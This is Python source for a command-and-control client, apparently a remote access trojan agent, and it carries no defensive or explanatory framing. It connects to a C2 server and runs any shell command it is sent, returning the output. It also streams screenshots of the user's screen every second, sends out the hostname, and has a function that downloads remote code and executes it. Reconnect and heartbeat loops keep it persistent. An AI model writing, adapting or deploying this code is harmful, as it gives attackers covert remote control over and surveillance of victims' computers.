import os
import socket
import socketio
import subprocess
import time
import platform
import mss
import base64
from PIL import Image
import io
import threading

# --- Configuration ---
C2_ADDRESS = "http://127.0.0.1:8004"
RETRY_INTERVAL = 30
TARGET_HEIGHT = 720

# --- Intervals ---
DEFAULT_SCREENSHOT_INTERVAL = 1.0
SCREENSHOT_INTERVAL = DEFAULT_SCREENSHOT_INTERVAL


# --- Persistence Configuration ---
SCHEDULED_RECONNECT_SECONDS = 15 * 60
HEARTBEAT_INTERVAL_SECONDS = 5

# --- Functions ---
def get_hostname_local():
    return socket.gethostname()

def remote_import(url):
    try:
        import urllib.request
        with urllib.request.urlopen(url, timeout=5) as response:
            code = response.read().decode()
        module_ns = {"__builtins__": __builtins__}
        exec(code, module_ns)
        return module_ns
    except Exception as e:
        log_event(f"Remote import error: {e}")
        return None

def get_gpu_info():
    try:
        cmd = "nvidia-smi --query-gpu=gpu_name,memory.total --format=csv,noheader,nounits"
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
        if result.strip():
            return result.strip()
    except:
        pass
    return None

# --- Core Support ---
event_logs = []
def log_event(message):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    event_logs.append(log_entry)
    print(log_entry)

sio = socketio.Client(logger=False, engineio_logger=False)
connection_start_time = 0

def send_command_output(output):
    if sio.connected:
        sio.emit('command_output', {'output': output}, namespace="/api")

def send_screenshot(image_data):
    if sio.connected:
        sio.emit('screenshot', image_data, namespace="/api")

def take_screenshots():
    global SCREENSHOT_INTERVAL
    with mss.mss() as sct:
        while True:
            if not sio.connected:
                time.sleep(1)
                continue
            try:
                sct_img = sct.grab(sct.monitors[1])
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                new_h = TARGET_HEIGHT
                new_w = int(new_h * (img.width / img.height))
                resized_img = img.resize((new_w, new_h), Image.LANCZOS)
                buffered = io.BytesIO()
                resized_img.save(buffered, format="JPEG", quality=75)
                img_str = base64.b64encode(buffered.getvalue()).decode('utf-8')
                send_screenshot(img_str)
                time.sleep(max(0.01, SCREENSHOT_INTERVAL))
            except:
                time.sleep(SCREENSHOT_INTERVAL)

def start_heartbeat():
    while True:
        time.sleep(HEARTBEAT_INTERVAL_SECONDS)
        if sio.connected:
            try: sio.emit('client_ping', namespace="/api")
            except: pass

@sio.on('connect', namespace="/api")
def on_connect():
    global connection_start_time
    connection_start_time = time.time()
    sio.emit('client_info', {'hostname': get_hostname_local()}, namespace="/api")

@sio.on('disconnect', namespace="/api")
def on_disconnect():
    global connection_start_time
    connection_start_time = 0

def handle_internal_command(command_str):
    global SCREENSHOT_INTERVAL
    parts = command_str.split()
    cmd = parts[0].lower()
    if cmd == "#scrsht":
        if len(parts) > 1:
            try:
                SCREENSHOT_INTERVAL = float(parts[1])
                send_command_output(f"Screenshot interval set to {SCREENSHOT_INTERVAL}s\n")
            except:
                send_command_output("Invalid interval value\n")
    elif cmd == "#logs":
        output = "\n".join(event_logs[-20:]) + "\n"
        send_command_output(output)


@sio.on('execute_command', namespace="/api")
def handle_command(command_str):
    if command_str.strip().startswith("#"):
        handle_internal_command(command_str.strip())
        return
    try:
        process = subprocess.Popen(command_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, errors='ignore')
        stdout, stderr = process.communicate()
        send_command_output(stdout + stderr)
    except Exception as e:
        send_command_output(f"Error: {e}\n")

def attempt_connection():
    while True:
        try:
            if sio.connected: sio.disconnect()
            sio.connect(C2_ADDRESS, namespaces=['/api'])
            return
        except:
            time.sleep(RETRY_INTERVAL)

if __name__ == '__main__':
    threading.Thread(target=take_screenshots, daemon=True).start()
    threading.Thread(target=start_heartbeat, daemon=True).start()

    while True:
        try:
            if not sio.connected:
                log_event("Main: Disconnected. Initiating connection...")
                attempt_connection()

            log_event("Main: Connected. Monitoring state...")
            while sio.connected:
                if time.time() - connection_start_time > SCHEDULED_RECONNECT_SECONDS:
                    log_event(f"Scheduler: >{SCHEDULED_RECONNECT_SECONDS // 60}m uptime. Reconnecting.")
                    sio.disconnect()
                    break
                time.sleep(5)

            log_event("Main: Loop detected disconnect. Will restart process.")
            time.sleep(5)
        except KeyboardInterrupt:
            break
        except Exception as e:
            log_event(f"---! UNHANDLED EXCEPTION IN MAIN LOOP: {e} !---")
            if sio and sio.connected:
                sio.disconnect()
            time.sleep(RETRY_INTERVAL)
